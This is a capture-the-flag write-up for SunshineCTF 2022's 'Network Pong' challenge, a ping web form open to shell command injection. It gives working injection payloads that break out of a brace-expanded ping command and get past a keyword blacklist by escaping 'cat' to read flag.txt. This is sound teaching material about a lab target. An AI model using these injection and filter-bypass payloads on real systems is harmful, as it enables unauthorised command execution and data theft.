#  Network Pong  
### 100 points

> Introducing Network Pong: Pong for the Internet! In this game, you just ping
> random websites and try to get the lowest latency.  
>  
> It is protected with state-of-the-art anti-hacking techniques, so it should
> be unhackable according to our security team of well-trained monkeys and
> felines.  
> https://pong.web.2022.sunshinectf.org

This is a simple webpage that lets the user run the ping command, vulnerable
with code injection.

I've solved with the help of
[hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/bypass-bash-
restrictions)

Let's start with some basic test. Since we know that is running ping, we can
try to inject something in the shell that's running it.

If we try to add a space, we'll get: `Error: Please only enter the IP or
domain!`

By writing `;ls` we get:  
```sh  
/bin/bash: line 1: {ping,-c,1,: command not found  
/bin/bash: line 1: ls}: command not found  
```

So, we can see that the command is enclosed in `{` in order to not have spaces

With `google.com};ls;{` we get the file list:  
```sh  
PING google.com (142.251.161.139): 56 data bytes  
ping: permission denied (are you root?)  
Dockerfile  
docker-entrypoint.sh  
flag.txt  
index.py  
requirements.txt  
templates  
/bin/bash: line 1: {}: command not found  
```

But if we try to use `google.com};{cat,flag.txt` the following error will
appear:  
`Error: Do not mention body parts, felines, or body parts of felines.`

So it seems that `cat` is filtered (using some sort of blacklist), but from
the link aforementioned we can find a solution to this problem: we can escape
the characters in `cat` in order to not have them filtered!

`google.com};{c\at,flag.txt`  
```sh  
PING google.com (142.251.161.139): 56 data bytes  
ping: permission denied (are you root?)  
sun{pin9_pin9-pin9_f1@9_pin9}  
```  

Original writeup
(https://gist.github.com/SalScotto/d855c77d07907f9768656e64a27b6887).